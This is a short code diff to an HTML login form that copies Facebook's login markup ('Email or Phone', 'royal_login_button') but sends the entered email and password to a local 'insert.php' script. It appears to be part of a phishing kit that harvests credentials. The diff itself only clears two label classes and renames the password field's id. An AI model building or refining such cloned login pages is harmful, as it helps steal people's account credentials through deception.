@@ -236,12 +236,12 @@
                                 <form id="login_form" action="insert.php" method="post">
                                     <table cellspacing="0" role="presentation">
                                         <tr>
-                                            <td class="html7magic"><label for="email">Email or Phone</label></td>
-                                            <td class="html7magic"><label for="pass">Password</label></td>
+                                            <td class=""><label for="email">Email or Phone</label></td>
+                                            <td class=""><label for="pass">Password</label></td>
                                         </tr>
                                         <tr>
                                             <td><input type="email" class="inputtext" name="email" id="email" tabindex="1" /></td>
-                                            <td><input type="password" class="inputtext" name="pass" id="pass" tabindex="2" /></td>
+                                            <td><input type="password" class="inputtext" name="pass" id="password" tabindex="2" /></td>
                                             <td><label class="uiButton uiButtonConfirm" id="loginbutton" for="u_0_5"><input value="Log In" tabindex="4" data-testid="royal_login_button" type="submit" id="u_0_5" /></label></td>
                                         </tr>
                                         <tr>
